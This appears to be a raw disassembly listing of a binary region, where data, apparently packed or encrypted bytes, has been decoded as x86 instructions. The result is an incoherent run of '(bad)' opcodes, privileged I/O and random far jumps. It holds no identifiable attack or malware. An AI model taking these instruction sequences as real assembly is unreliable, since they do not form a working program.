  4206b2:	add    BYTE PTR [eax],al
  4206b4:	xchg   edx,eax
  4206b5:	cmp    al,0x23
  4206b7:	jle    0x420668
  4206b9:	jg     0x42069a
  4206bb:	cld    
  4206bc:	jo     0x4206a6
  4206be:	hlt    
  4206bf:	leave  
  4206c0:	arpl   ax,bx
  4206c2:	adc    DWORD PTR [ebp+0x15bbe],ecx
  4206c8:	test   BYTE PTR [eax],0x0
  4206cb:	add    BYTE PTR [ebp-0x5f],cl
  4206ce:	mov    ch,0x4
  4206d0:	mov    edi,0xf3e7f10
  4206d5:	xchg   esp,eax
  4206d6:	nop
  4206d7:	clc    
  4206d8:	iret   
  4206d9:	loope  0x42073d
  4206db:	add    DWORD PTR [edx+0x56],0xb66ef370
  4206e2:	pop    ecx
  4206e3:	aas    
  4206e4:	cmp    eax,0xa1635f89
  4206e9:	inc    edx
  4206ea:	and    bh,BYTE PTR [eax]
  4206ec:	mov    al,BYTE PTR [eax-0xce9fe2b]
  4206f2:	sub    cl,BYTE PTR ds:0x63880f6
  4206f8:	(bad)  
  4206f9:	nop
  4206fa:	push   cs
  4206fb:	hlt    
  4206fc:	sar    BYTE PTR ds:0xaa0fef10,cl
  420702:	(bad)  [edi+edi*1]
  420705:	xor    DWORD PTR [ecx],eax
  420707:	sub    BYTE PTR [ebx+0x21],0x6c
  42070b:	and    BYTE PTR [ecx],ch
  42070d:	add    bh,ch
  42070f:	mov    al,ds:0x12ddc186
  420714:	pop    esp
  420715:	pop    es
  420716:	dec    eax
  420717:	push   ss
  420718:	addr16 push edx
  42071a:	mov    eax,0x5f3f031c
  42071f:	pop    ds
  420720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420721:	xor    edi,DWORD PTR [eax-0x52]
  420724:	shl    DWORD PTR [ebx-0x74],0x87
  420728:	pusha  
  420729:	mov    ebp,0xc5785c8a
  42072e:	inc    ecx
  42072f:	or     eax,0xae2649c9
  420734:	mov    ch,0xcb
  420736:	repnz xlat BYTE PTR ds:[ebx]
  420738:	pop    ecx
  420739:	mov    ch,0xd6
  42073b:	test   ecx,esp
  42073d:	lds    esi,FWORD PTR ds:0x79abdf7f
  420743:	(bad)  [ebp-0x72]
  420746:	loopne 0x420736
  420748:	mov    esp,0x2025348
  42074d:	mov    eax,ds:0xcb3cab5e
  420752:	bswap  esi
  420754:	mov    ds:0x746b6579,al
  420759:	pop    ebx
  42075a:	cld    
  42075b:	mov    BYTE PTR [ebx-0x45],0x7e
  42075f:	ins    DWORD PTR es:[edi],dx
  420760:	cmpxchg DWORD PTR [esi+0x95af874],esi
  420767:	add    eax,0x97ddcbcb
  42076c:	dec    esp
  42076d:	enter  0xa163,0x65
  420771:	fistp  DWORD PTR [eax-0x6ed6ca3b]
  420777:	and    BYTE PTR ds:0x2ba03aae,ch
  42077d:	dec    ebx
  42077e:	cmp    DWORD PTR [ebp-0x27bedf77],0x69
  420785:	pop    esp
  420786:	sar    DWORD PTR [ecx-0x78be6ac8],0x24
  42078d:	pop    ss
  42078e:	mov    BYTE PTR [ecx+0x49],bl
  420791:	aam    0x35
  420793:	pop    esi
  420794:	popf   
  420795:	ja     0x4207a2
  420797:	scas   al,BYTE PTR es:[edi]
  420798:	fisttp QWORD PTR [edi+0x6be569a0]
  42079e:	shr    DWORD PTR [edi+0x77],0x7
  4207a2:	xchg   edx,eax
  4207a3:	inc    ebp
  4207a4:	test   eax,0xb96bdeb2
  4207a9:	or     al,0x1
  4207ab:	aaa    
  4207ac:	icebp  
  4207ad:	cmc    
  4207ae:	outs   dx,DWORD PTR ds:[esi]
  4207af:	mov    ch,0x1a
  4207b1:	pop    es
  4207b2:	cmp    BYTE PTR [ecx-0x7f],al
  4207b5:	arpl   WORD PTR [eax+0x34908fa9],bp
  4207bb:	ins    BYTE PTR es:[edi],dx
  4207bc:	mov    WORD PTR [esi+edi*8],cs
  4207bf:	hlt    
  4207c0:	mov    eax,ds:0x20
	...
  420831:	add    BYTE PTR [eax],al
  420833:	add    BYTE PTR [ecx+0x3b920b9a],ah
  420839:	xchg   ebx,eax
  42083a:	mov    ecx,0xafa823bb
  42083f:	mov    bh,0x55
  420841:	inc    ecx
  420842:	retf   0xb4e8
  420845:	pop    esp
  420846:	add    DWORD PTR [eax],eax
  420848:	test   BYTE PTR [eax],0x0
  42084b:	add    BYTE PTR [esi-0x79],bl
  42084e:	test   eax,0x89067286
  420853:	lea    edi,ds:0x88bb1252
  420859:	outs   dx,DWORD PTR ds:[esi]
  42085a:	(bad)  
  42085b:	xlat   BYTE PTR ds:[ebx]
  42085c:	or     ebp,esp
  42085e:	fistp  WORD PTR [edx-0x21222a3a]
  420864:	fdiv   QWORD PTR [ebp+0x4d33de97]
  42086a:	repnz mov eax,ds:0xdbdca54
  420870:	inc    ecx
  420871:	(bad)  
  420872:	scas   al,BYTE PTR es:[edi]
  420873:	jns    0x4208c4
  420875:	icebp  
  420876:	shr    DWORD PTR [ebx+0x69],1
  420879:	push   es
  42087a:	sbb    edi,edi
  42087c:	sbb    esp,DWORD PTR [eax]
  42087e:	scas   al,BYTE PTR es:[edi]
  42087f:	push   0x2e
  420881:	adc    BYTE PTR [edx-0x4],cl
  420884:	outs   dx,BYTE PTR ds:[esi]
  420885:	aam    0xa1
  420887:	inc    esi
  420888:	aas    
  420889:	call   0x7a1b7135
  42088e:	sbb    eax,0x94a8671c
  420893:	mov    ebp,0xb0240038
  420898:	lods   al,BYTE PTR ds:[esi]
  420899:	neg    BYTE PTR [ebx]
  42089b:	dec    edx
  42089c:	lahf   
  42089d:	das    
  42089e:	arpl   WORD PTR [ebx],si
  4208a0:	std    
  4208a1:	ret    0xed26
  4208a4:	jmp    FWORD PTR [eax+ecx*4-0x67]
  4208a8:	dec    eax
  4208a9:	retf   
  4208aa:	int3   
  4208ab:	pop    ecx
  4208ac:	dec    ebp
  4208ad:	add    DWORD PTR [edx],ebx
  4208af:	(bad)  
  4208b0:	data16 sbb al,0x9d
  4208b3:	or     DWORD PTR [edx+0x6d7b201b],0x5ce010a4
  4208bd:	push   ebx
  4208be:	hlt    
  4208bf:	xor    al,0x91
  4208c1:	icebp  
  4208c2:	je     0x42091b
  4208c4:	fistp  DWORD PTR [eax+0x7a]
  4208c7:	mov    al,ds:0x2e07df08
  4208cc:	adc    al,0x87
  4208ce:	mov    ecx,0xa9e45120
  4208d3:	dec    esp
  4208d4:	sbb    bh,ah
  4208d6:	js     0x420943
  4208d8:	mov    dh,0x5e
  4208da:	or     al,0xc3
  4208dc:	push   edx
  4208dd:	popa   
  4208de:	pop    ecx
  4208df:	jp     0x420955
  4208e1:	push   0x52
  4208e3:	rcr    BYTE PTR [edx],0xce
  4208e6:	xor    eax,0x67cc61a9
  4208eb:	loop   0x420892
  4208ed:	mov    dh,BYTE PTR [edx]
  4208ef:	(bad)  
  4208f1:	cmp    eax,0x8309a1e1
  4208f6:	dec    eax
  4208f7:	jg     0x42095f
  4208f9:	out    0x33,eax
  4208fb:	mov    ah,0x3a
  4208fd:	addr16 pop ds
  4208ff:	stc    
  420900:	out    0xd3,al
  420902:	pop    es
  420903:	push   edi
  420904:	repz push ebp
  420906:	aas    
  420907:	and    al,0xd3
  420909:	or     edx,DWORD PTR [esi-0x51]
  42090c:	aam    0x17
  42090e:	in     eax,0xe2
  420910:	out    dx,eax
  420911:	jge    0x42093c
  420913:	jp     0x4208e7
  420915:	dec    edi
  420916:	dec    esp
  420917:	push   edx
  420918:	mov    bh,0xa0
  42091a:	adc    eax,0xd1c58a03
  42091f:	icebp  
  420920:	adc    eax,0xf551fb13
  420925:	aas    
  420926:	test   eax,0xd17cbafd
  42092b:	test   DWORD PTR [edx],edi
  42092d:	pop    ecx
  42092e:	addr16 icebp 
  420930:	inc    ecx
  420931:	sub    al,0x8a
  420933:	inc    esp
  420934:	pusha  
  420935:	mov    ch,0x5a
  420937:	stos   BYTE PTR es:[edi],al
  420938:	fst    st(3)
  42093a:	jp     0x4208cb
  42093c:	cmp    DWORD PTR ds:0x8404611a,ecx
	...
  4209b2:	add    BYTE PTR [eax],al
  4209b4:	or     al,BYTE PTR [ecx-0x49]
  4209b7:	mov    eax,ds:0xeb1ef7ff
  4209bc:	rcr    BYTE PTR [esi-0x30e69922],0x81
  4209c3:	dec    edi
  4209c4:	stos   BYTE PTR es:[edi],al
  4209c5:	pop    ebp
  4209c6:	add    DWORD PTR [eax],eax
  4209c8:	test   BYTE PTR [eax],0x0
  4209cb:	add    BYTE PTR [esi-0x9],cl
  4209ce:	retf   0x4e12
  4209d1:	jecxz  0x420a18
  4209d3:	cs mov bh,0xe0
  4209d6:	mov    WORD PTR [ebx],ds
  4209d8:	or     dh,BYTE PTR [ebx+eiz*1-0x6b]
  4209dc:	out    dx,eax
  4209dd:	dec    ecx
  4209de:	dec    eax
  4209df:	ror    DWORD PTR [esi+0xdada154],1
  4209e5:	pop    esi
  4209e6:	push   eax
  4209e7:	sbb    DWORD PTR [eax+0xe2dec3b],0x49a64125
  4209f1:	add    BYTE PTR [ecx-0x76],0x5
  4209f5:	cli    
  4209f6:	pop    ecx
  4209f7:	mov    edi,0x400422ff
  4209fc:	jmp    0x26d2:0xdc80bdca
  420a03:	in     al,dx
  420a04:	out    dx,al
  420a05:	mov    esi,0xaaef8073
  420a0a:	ins    BYTE PTR es:[edi],dx
  420a0b:	mov    dh,0x9e
  420a0d:	push   ebp
  420a0e:	pop    ecx
  420a0f:	or     edx,DWORD PTR [ebp-0x11]
  420a12:	or     al,0x86
  420a14:	xchg   esp,eax
  420a15:	inc    edi
  420a16:	push   ss
  420a17:	sbb    bh,cl
  420a19:	dec    esi
  420a1a:	sbb    al,0x8d
  420a1c:	dec    esp
  420a1d:	fsubrp st(0),st
  420a1f:	rol    ecx,0x89
  420a22:	call   0x90b:0x8980d981
  420a29:	push   ebp
  420a2a:	jl     0x4209db
  420a2c:	loop   0x4209b8
  420a2e:	fsubr  DWORD PTR [ebp+0xe7c6da8]
  420a34:	je     0x420a4e
  420a36:	push   edi
  420a37:	div    al
  420a39:	outs   dx,BYTE PTR ds:[esi]
  420a3a:	cdq    
  420a3b:	dec    eax
  420a3c:	loopne 0x420a0b
  420a3e:	pusha  
  420a3f:	ins    BYTE PTR es:[edi],dx
  420a40:	or     eax,0x27d84013
  420a45:	fwait
  420a46:	retf   
  420a47:	mov    ebx,0x179604
  420a4c:	ja     0x420a73
  420a4e:	xor    dh,dl
  420a50:	xor    BYTE PTR [edx],al
  420a52:	push   0x5b
  420a54:	mov    ebx,esi
  420a56:	enter  0x3b3e,0x41
  420a5a:	cs jo  0x420a75
  420a5d:	push   edi
  420a5e:	sbb    al,BYTE PTR [edx-0x1e4e0c84]
  420a64:	in     eax,dx
  420a65:	sub    ebx,DWORD PTR [ebp-0x5097169c]
  420a6b:	push   edx
  420a6c:	sti    
  420a6d:	sbb    bl,dl
  420a6f:	inc    ebx
  420a70:	daa    
  420a71:	jle    0x420ac0
  420a73:	push   ecx
  420a74:	dec    edx
  420a75:	push   ebx
  420a76:	adc    ecx,esi
  420a78:	repz iret 
  420a7a:	jb     0x420a58
  420a7c:	inc    eax
  420a7d:	imul   edi,DWORD PTR [ebp-0x20],0x10a90fba
  420a84:	fist   WORD PTR [esi-0x44]
  420a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a88:	mov    ds:0xd1b3c2cd,al
  420a8d:	cmovle esi,DWORD PTR [ebp+0x24]
  420a91:	or     dl,BYTE PTR [esi+0x46d3a02]
  420a97:	pop    ds
  420a98:	in     al,0xb8
  420a9a:	add    BYTE PTR [ecx-0x19990ea5],al
  420aa0:	jp     0x420a56
  420aa2:	mov    eax,0x42a414bc
  420aa7:	inc    edi
  420aa8:	les    esi,FWORD PTR [ebp+0x26]
  420aab:	jno    0x420aff
  420aad:	es jmp 0x420aa6
  420ab0:	stos   BYTE PTR es:[edi],al
  420ab1:	jae    0x420aa5
  420ab3:	push   ebx
  420ab4:	mov    ds:0x96741ad0,eax
  420ab9:	call   0xc6d8:0x3ce13575
  420ac0:	loope  0x420b1d
	...
  420b32:	add    BYTE PTR [eax],al
  420b34:	fsubr  QWORD PTR [eax]
  420b36:	mov    ah,ah
  420b38:	(bad)  
  420b39:	out    0xfe,al
  420b3b:	cmp    BYTE PTR [edi+0x39],dl
  420b3e:	dec    edx
  420b3f:	movzx  esi,WORD PTR [edi]
  420b42:	lahf   
  420b43:	retf   0x5ea0
  420b46:	add    DWORD PTR [eax],eax
  420b48:	test   BYTE PTR [eax],0x0
  420b4b:	add    cl,dh
  420b4d:	push   ss
  420b4e:	xchg   edi,eax
  420b4f:	fwait
  420b50:	iret   
  420b51:	and    DWORD PTR [ebx],ecx
  420b53:	cli    
  420b54:	nop
  420b55:	js     0x420b11
  420b57:	clc    
  420b58:	in     eax,dx
  420b59:	mov    ds:0x1cffb85,eax
  420b5e:	pop    ss
  420b5f:	cmp    DWORD PTR [edi+ebp*8-0x10],0x4edd9d5d
  420b67:	cld    
  420b68:	cmp    bh,BYTE PTR [ebp-0x51]
  420b6b:	cwde   
  420b6c:	dec    esp
  420b6d:	pop    es
  420b6e:	mov    WORD PTR [ebp-0x1a472c7b],?
  420b74:	xchg   ebp,eax
  420b75:	sub    BYTE PTR [eax+0x2b81e941],al
  420b7b:	repnz frstor [edi+0x2c]
  420b7f:	pop    es
  420b80:	outs   dx,DWORD PTR ds:[esi]
  420b81:	mov    BYTE PTR [ebp+0x7c1f09ed],ah
  420b87:	mov    esi,DWORD PTR [edi-0x36d4aba]
  420b8d:	pop    es
  420b8e:	add    DWORD PTR [ecx+0x18],esi
  420b91:	test   BYTE PTR [edx],dl
  420b93:	daa    
  420b94:	arpl   bp,cx
  420b96:	mov    dl,0x7a
  420b98:	(bad)  
  420b99:	pop    esi
  420b9a:	(bad)  
  420b9b:	shl    BYTE PTR [eax-0x31],cl
  420b9e:	jo     0x420b64
  420ba0:	lahf   
  420ba1:	(bad)  
  420ba2:	mov    ecx,0xa12c2845
  420ba7:	inc    esi
  420ba8:	data16 adc bl,BYTE PTR [edi]
  420bab:	mov    ecx,0x7c190169
  420bb0:	mov    WORD PTR [ebp+0x1b],fs
  420bb3:	cmp    BYTE PTR [ecx],bl
  420bb5:	dec    esi
  420bb6:	add    al,0x37
  420bb8:	push   ebp
  420bb9:	out    dx,al
  420bba:	inc    eax
  420bbb:	push   0x36
  420bbd:	out    0xcc,al
  420bbf:	sub    edi,DWORD PTR [esi-0x21]
  420bc2:	jbe    0x420b9a
  420bc4:	add    DWORD PTR [eax],eax
  420bc6:	dec    eax
  420bc7:	lea    esi,[ebx-0x1a]
  420bca:	add    cl,cl
  420bcc:	(bad)  
  420bcd:	retf   0x99e0
  420bd0:	xor    DWORD PTR ds:0x5ae6b3dd,edx
  420bd6:	sbb    al,bl
  420bd8:	test   BYTE PTR ds:0x2edc85d3,bh
  420bde:	(bad)  
  420bdf:	fisttp DWORD PTR [esi-0x6b5dd52]
  420be5:	and    bh,BYTE PTR [esi]
  420be7:	inc    ecx
  420be8:	dec    eax
  420be9:	popf   
  420bea:	neg    DWORD PTR [ebx+0x3c60581b]
  420bf0:	mov    BYTE PTR [ecx+0x22d8b8fd],dh
  420bf6:	outs   dx,DWORD PTR ds:[esi]
  420bf7:	fisubr DWORD PTR [eax-0x68]
  420bfa:	jecxz  0x420c1c
  420bfc:	xor    esp,DWORD PTR [edx+0x7d]
  420bff:	jne    0x420bc7
  420c01:	jp     0x420c54
  420c03:	mov    esp,0x13ebf1ea
  420c08:	mov    esi,ecx
  420c0a:	lea    ebp,[esi-0x6f9b15c]
  420c10:	not    DWORD PTR [edi-0x30b5141c]
  420c16:	pop    ss
  420c17:	push   0xfffffffc
  420c19:	jb     0x420c5e
  420c1b:	aas    
  420c1c:	in     al,dx
  420c1d:	out    dx,eax
  420c1e:	adc    al,dl
  420c20:	loopne 0x420c62
  420c22:	pop    esi
  420c23:	imul   esi,DWORD PTR [eax],0x3a6cd77d
  420c29:	cmp    eax,0x12d0623b
  420c2e:	push   esp
  420c30:	mov    dl,0xa
  420c32:	(bad)  
  420c34:	loopne 0x420c94
  420c36:	popa   
  420c37:	divps  xmm1,XMMWORD PTR [eax-0x32e12f9f]
  420c3e:	xchg   DWORD PTR [edx],edi
  420c40:	fldenv [esi]
	...
  420cb2:	add    BYTE PTR [eax],al
  420cb4:	or     al,0x6a
  420cb6:	push   edx
  420cb7:	shl    DWORD PTR [esi-0x7],0x9f
  420cbb:	out    dx,eax
  420cbc:	xchg   ecx,eax
  420cbd:	inc    ecx
  420cbe:	push   0x4dae085f
  420cc3:	sbb    edx,DWORD PTR [esi-0x9fffea1]
  420cc9:	add    BYTE PTR [eax],al
  420ccb:	add    cl,bl
  420ccd:	jg     0x420c5c
  420ccf:	int    0xaa
  420cd1:	call   0x779126bd
  420cd6:	xchg   esi,eax
  420cd7:	mov    al,ds:0xdd3c4e92
  420cdc:	icebp  
  420cdd:	call   0x5bcf74e5
  420ce2:	cli    
  420ce3:	jg     0x420d61
  420ce5:	rcl    BYTE PTR [esi+0xffbe3e3],cl
  420ceb:	out    0xb7,eax
  420ced:	jle    0x420c6f
  420cef:	cmp    BYTE PTR [ecx],dh
  420cf1:	ins    BYTE PTR es:[edi],dx
  420cf2:	test   BYTE PTR [esi+0x71],0x8a
  420cf6:	jo     0x420ce9
  420cf8:	repz jbe 0x420d12
  420cfb:	xchg   edi,eax
  420cfc:	sub    eax,0x405349a5
  420d01:	in     eax,0x37
  420d03:	xchg   edi,esp
  420d05:	lahf   
  420d06:	ret    
  420d07:	loop   0x420d29
  420d09:	dec    ebx
  420d0a:	fdivp  st(1),st
  420d0c:	fst    QWORD PTR [eax+0x496e365e]
  420d12:	or     al,0x68
  420d14:	adc    ch,bl
  420d16:	xchg   ebp,edi
  420d18:	or     eax,0x343ab79d
  420d1d:	and    BYTE PTR [esi+0x36f6ac50],ch
  420d23:	and    esi,eax
  420d25:	rol    DWORD PTR [ecx+0x5aaa6bbc],0x69
  420d2c:	mul    DWORD PTR [esi-0x3adeb42a]
  420d32:	call   0xbfbc5562
  420d37:	aam    0x52
  420d39:	push   ebx
  420d3a:	mov    eax,0xa5c301da
  420d3f:	scas   eax,DWORD PTR es:[edi]
  420d40:	sub    ebp,ecx
  420d42:	and    al,0x1d
  420d44:	sub    edi,DWORD PTR [ebp-0x57]
  420d47:	sbb    DWORD PTR cs:[ebx],edx
  420d4a:	add    ah,BYTE PTR [edi]
  420d4c:	dec    esp
  420d4d:	stc    
  420d4e:	leave  
  420d4f:	mov    eax,0x10a900be
  420d54:	mov    dh,0x1c
  420d56:	push   esi
  420d57:	cmp    ah,0xb1
  420d5a:	call   0x4ead:0x5a26ceae
  420d61:	and    BYTE PTR [ecx+esi*2-0x49],cl
  420d65:	cmp    eax,0x7a1374a3
  420d6a:	icebp  
  420d6b:	sbb    ebp,DWORD PTR [eax-0x64355d8e]
  420d71:	int3   
  420d72:	lods   eax,DWORD PTR ds:[esi]
  420d73:	pop    edx
  420d74:	dec    ebx
  420d75:	shl    DWORD PTR [edx-0x7c],cl
  420d78:	or     al,0x96
  420d7a:	fs test eax,0x43caf0f5
  420d80:	jae    0x420de7
  420d82:	xchg   esi,eax
  420d83:	cmp    ebp,edx
  420d85:	xchg   edx,eax
  420d86:	pop    edi
  420d87:	mov    al,ds:0xb21a7457
  420d8c:	cmp    eax,0x9473f5e7
  420d91:	pop    esp
  420d92:	stos   BYTE PTR es:[edi],al
  420d93:	sub    cl,bh
  420d95:	mov    dh,0x25
  420d97:	ds je  0x420dc7
  420d9a:	lds    esp,FWORD PTR [ecx]
  420d9c:	rol    eax,0xef
  420d9f:	ror    edx,0x17
  420da2:	push   ss
  420da3:	mov    ds:0xeff5fa3d,al
  420da8:	sub    eax,0x1fff8f82
  420dad:	mov    bl,0x96
  420daf:	ins    BYTE PTR es:[edi],dx
  420db0:	aam    0x92
  420db2:	pop    ebp
  420db3:	sar    BYTE PTR [esi+0x23ca15d4],1
  420db9:	pushf  
  420dba:	add    ch,0x58
  420dbd:	ins    BYTE PTR es:[edi],dx
  420dbe:	mov    ebp,0xc10570
	...
  420e33:	add    BYTE PTR [edx-0x1865ab],ch
  420e39:	out    dx,eax
  420e3a:	call   FWORD PTR [ebp+0x64]
  420e3d:	inc    ebx
  420e3e:	and    edx,ecx
  420e40:	call   0x160:0x8c6f79bc
  420e47:	add    dh,dh
  420e49:	add    BYTE PTR [eax],al
  420e4b:	add    bh,al
  420e4d:	neg    DWORD PTR [eax+0x44]
  420e50:	sar    esi,1
  420e52:	ds retf 0x4216
  420e56:	mov    ecx,0xe74a7256
  420e5b:	push   esp
  420e5c:	inc    eax
  420e5d:	jp     0x420eb8
  420e5f:	loope  0x420e65
  420e61:	xor    ah,ah
  420e63:	loop   0x420e9a
  420e65:	pop    ss
  420e66:	cmp    eax,ebx
  420e68:	stos   BYTE PTR es:[edi],al
  420e69:	push   ss
  420e6a:	mov    edi,DWORD PTR [eax+ebx*2]
  420e6d:	add    eax,DWORD PTR [esp+ebx*8+0x381ae832]
  420e74:	rol    DWORD PTR [ebx],0x91
  420e77:	xchg   esi,eax
  420e78:	mov    bh,0xfa
  420e7a:	shl    dl,cl
  420e7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e7d:	jmp    0x1a25:0xd5136553
  420e84:	fcom   DWORD PTR [edi-0x79885a7b]
  420e8a:	and    eax,0xcda24852
  420e8f:	add    edx,DWORD PTR [ebx-0x7008e8a7]
  420e95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e96:	daa    
  420e97:	cmp    BYTE PTR [edi],ch
  420e99:	ds jmp 0x9faa:0x77ddcbf8
  420ea1:	push   cs
  420ea2:	mov    ah,0x15
  420ea4:	inc    esp
  420ea5:	test   DWORD PTR [ebx+0x1d283431],eax
  420eab:	fucom  st(0)
  420ead:	push   esi
  420eae:	mov    al,0x16
  420eb0:	pop    esi
  420eb1:	jns    0x420f23
  420eb3:	ror    esi,0x96
  420eb6:	jnp    0x420f1a
  420eb8:	data16 fadd st,st(2)
  420ebb:	jb     0x420efd
  420ebd:	xor    eax,0x589b5a35
  420ec2:	mov    cl,al
  420ec4:	adc    eax,0xb5cd827
  420ec9:	(bad)  
  420eca:	xor    ch,dh
  420ecc:	enter  0xc9cc,0x72
  420ed0:	inc    ebp
  420ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ed2:	mov    bh,0x19
  420ed4:	mov    esi,0x644c4e57
  420ed9:	push   eax
  420eda:	psllq  mm4,QWORD PTR ds:[edi]
  420ede:	dec    esi
  420edf:	or     edi,DWORD PTR ds:0xf4a9e627
  420ee5:	push   ebx
  420ee6:	xchg   ebx,eax
  420ee7:	or     eax,0x8eeb4243
  420eec:	xchg   DWORD PTR [eax+eiz*2+0x29723e32],esi
  420ef3:	enter  0xc658,0xfc
  420ef7:	stos   BYTE PTR es:[edi],al
  420ef8:	imul   bx,WORD PTR [esp+ebp*4],0x13
  420efd:	outs   dx,DWORD PTR ds:[esi]
  420efe:	rol    ecx,0x9d
  420f01:	inc    edi
  420f02:	fwait
  420f03:	iret   
  420f04:	xchg   ebx,eax
  420f05:	mov    ds:0x3c9eb830,al
  420f0a:	xor    DWORD PTR [ebp-0x30ab68bf],ebx
  420f10:	xchg   esi,eax
  420f11:	dec    ebx
  420f12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f13:	dec    esi
  420f14:	xchg   edi,eax
  420f15:	fist   WORD PTR [ebp-0x43897c3a]
  420f1b:	pop    es
  420f1c:	scas   eax,DWORD PTR es:[edi]
  420f1d:	rcl    DWORD PTR ds:0x9e1ad5dd,cl
  420f23:	repz jb 0x420f24
  420f26:	xchg   esp,eax
  420f27:	es xor al,0x7e
  420f2a:	push   es
  420f2b:	daa    
  420f2c:	fbld   TBYTE PTR [edx+edx*8-0x1794e9e4]
  420f33:	cmp    esp,DWORD PTR [edi-0x62]
  420f36:	and    DWORD PTR [ebx],eax
  420f38:	cmp    eax,DWORD PTR [eax]
  420f3a:	inc    edx
  420f3b:	dec    edi
  420f3c:	test   dl,0x42
  420f3f:	pop    esi
  420f40:	and    BYTE PTR [esi],cl
	...
  420fb2:	add    BYTE PTR [eax],al
  420fb4:	bound  esp,QWORD PTR [ebp-0x8808a]
  420fba:	imul   edi,DWORD PTR [ebp-0x6d53d0f4],0x37
  420fc1:	xchg   BYTE PTR [esi+0x34],ah
  420fc4:	and    BYTE PTR [ecx+0x1],0x0
  420fc8:	test   BYTE PTR [eax],0x0
  420fcb:	add    BYTE PTR [esi+0x39],bh
  420fce:	add    eax,DWORD PTR [ecx]
  420fd0:	out    dx,eax
  420fd1:	(bad)  
  420fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fd3:	jnp    0x420fe7
  420fd5:	push   ebx
  420fd6:	jp     0x420ff4
  420fd8:	ja     0x420fd6
  420fda:	pusha  
  420fdb:	adc    ebp,edx
  420fdd:	jl     0x420fe3
  420fdf:	and    esp,0xffffffeb
  420fe2:	out    0x3e,al
  420fe4:	pusha  
  420fe5:	push   edi
  420fe6:	dec    edx
  420fe7:	push   es
  420fe8:	pop    ds
  420fe9:	jp     0x420fe6
  420feb:	and    DWORD PTR [eax+0x16201daf],0xffffffb5
  420ff2:	dec    edi
  420ff3:	test   BYTE PTR ds:0xc1a6c4b7,cl
  420ff9:	mov    ah,0x4a
  420ffb:	jo     0x421050
  420ffd:	xchg   ebx,eax
  420ffe:	data16 into 
  421000:	add    al,cl
  421002:	inc    eax
  421003:	and    ebx,edx
  421005:	jno    0x421071
  421007:	imul   esi,edi,0x32
  42100a:	mov    ebx,0xdde0a2a2
  42100f:	ret    0x45b7
  421012:	lock inc ebp
  421014:	js     0x421006
  421016:	inc    edi
  421017:	call   0xd9cb:0x2dbe1ba7
  42101e:	int    0x34
  421020:	cli    
  421021:	js     0x421065
  421023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421024:	int    0xd3
  421026:	ja     0x421019
  421028:	xor    BYTE PTR [eax],ah
  42102a:	push   cs
  42102b:	sbb    al,0x1e
  42102d:	or     DWORD PTR [ebx+ecx*1+0x73],eax
  421031:	push   ecx
  421032:	(bad)  
  421033:	in     eax,dx
  421034:	sti    
  421035:	cmc    
  421036:	cmp    DWORD PTR [esi+0x5d],ebp
  421039:	retf   
  42103a:	lds    esp,FWORD PTR [ebp-0x12d8b074]
  421040:	out    0x51,eax
  421042:	xchg   ebx,eax
  421043:	jmp    0xc896:0x439ef3f5
  42104a:	shr    BYTE PTR [edi+0x14d074a6],cl
  421050:	loopne 0x420fea
  421052:	mov    esi,0xa756dcd6
  421057:	sub    al,0xc3
  421059:	lods   al,BYTE PTR ds:[esi]
  42105a:	jnp    0x420ffa
  42105c:	ror    DWORD PTR [edi],0x94
  42105f:	pop    ds
  421060:	pop    ecx
  421061:	into   
  421062:	sbb    al,ah
  421064:	rcr    BYTE PTR [ecx-0x6b89eff0],1
  42106a:	pop    edi
  42106b:	adc    DWORD PTR [ebx-0x6d],ebx
  42106e:	fbld   TBYTE PTR [ebp-0x7f262680]
  421074:	push   ds
  421075:	dec    esi
  421076:	mov    dh,0x84
  421078:	mov    bl,0xc8
  42107a:	push   cs
  42107b:	ror    BYTE PTR [esi],1
  42107d:	mov    ds:0x157e398,al
  421082:	and    BYTE PTR [edx+esi*2+0x2759a835],al
  421089:	add    DWORD PTR [edx+esi*1+0x21],edi
  42108d:	xchg   esi,eax
  42108e:	mov    cl,0x79
  421090:	js     0x421072
  421092:	xchg   BYTE PTR [ebx],cl
  421094:	cmp    eax,0x30472f91
  421099:	imul   ebp,DWORD PTR [edi],0xc6a826e8
  42109f:	mov    esp,0xd44b9fa0
  4210a4:	mov    DWORD PTR [edx-0x105fe35d],0x5806d70c
  4210ae:	fwait
  4210af:	cmc    
  4210b0:	std    
  4210b1:	xor    DWORD PTR [ebx],ecx
  4210b3:	cs push ss
  4210b5:	ret    0x71fc
  4210b8:	neg    ebp
  4210ba:	(bad)  
  4210bb:	sar    BYTE PTR [edi+0x75],cl
  4210be:	push   esi
  4210bf:	fisttp DWORD PTR [esi]
  4210c1:	int3   
	...
  421132:	add    BYTE PTR [eax],al
  421134:	jae    0x421105
  421136:	fwait
  421137:	cmp    DWORD PTR [edi+0x15cff37d],edi
  42113d:	dec    edi
  42113e:	data16 jg 0x42110d
  421141:	pop    edx
  421142:	mov    ah,0xbe
  421144:	js     0x4211a8
  421146:	add    DWORD PTR [eax],eax
  421148:	test   BYTE PTR [eax],0x0
  42114b:	add    BYTE PTR [eax+0x75],al
  42114e:	out    dx,eax
  42114f:	push   ebx
  421150:	scas   al,BYTE PTR es:[edi]
  421151:	jne    0x421180
  421153:	mov    ecx,0x68682394
  421158:	xlat   BYTE PTR ds:[ebx]
  421159:	jno    0x42116b
  42115b:	jg     0x4211c7
  42115d:	sbb    BYTE PTR [eax-0x1dc1d7ee],bh
  421163:	and    BYTE PTR [edi],dh
  421165:	mul    DWORD PTR [edx-0x65]
  421168:	push   eax
  421169:	test   dl,0xf6
  42116c:	aaa    
  42116d:	jl     0x421177
  42116f:	imul   eax,esi,0xeb29d7bb
  421175:	jge    0x421190
  421177:	sub    DWORD PTR [ecx+0x40a0e2b5],0x23719a5c
  421181:	push   0x92f37c89
  421186:	cwde   
  421187:	scas   al,BYTE PTR es:[edi]
  421188:	out    0xd,al
  42118a:	and    ebp,DWORD PTR [ebx-0x7ba0047d]
  421190:	push   ss
  421191:	push   ebx
  421192:	setno  BYTE PTR [edi+0x58021834]
  421199:	ja     0x421185
  42119b:	mov    bl,0x8c
  42119d:	mov    bh,0xcb
